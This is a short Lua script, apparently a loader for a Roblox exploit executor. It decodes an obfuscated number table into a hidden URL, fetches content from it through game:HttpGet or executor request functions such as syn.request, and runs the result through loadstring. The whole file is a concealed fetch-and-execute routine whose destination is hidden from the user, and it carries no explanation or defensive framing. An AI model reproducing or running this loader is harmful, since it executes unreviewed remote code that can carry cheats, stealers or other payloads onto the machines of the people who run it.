local function _d(t,k)local r={}for i=1,#t do r[i]=string.char(((t[i]-k-(i*19)-41)%256+256)%256)end return table.concat(r)end
local _u=_d({51,82,101,116,138,100,108,127,214,228,234,7,20,38,54,91,99,112,144,149,185,190,155,240,244,31,37,52,65,100,116,135,89,181,192,214,226,239,15,35,241,58,78,114,62,152,103,119,206},143)
local _f=(loadstring or load)
local _ok,_s=pcall(function()return game:HttpGet(_u,true)end)
if not _ok or type(_s)~="string" or #_s<8 then local _r=(getgenv and (getgenv().http_request or getgenv().request))or http_request or request or (syn and syn.request) if _r then local _x=_r({Url=_u,Method="GET"}) _s=_x and (_x.Body or _x.body) end end
if _f and type(_s)=="string" and #_s>0 then return _f(_s)() end
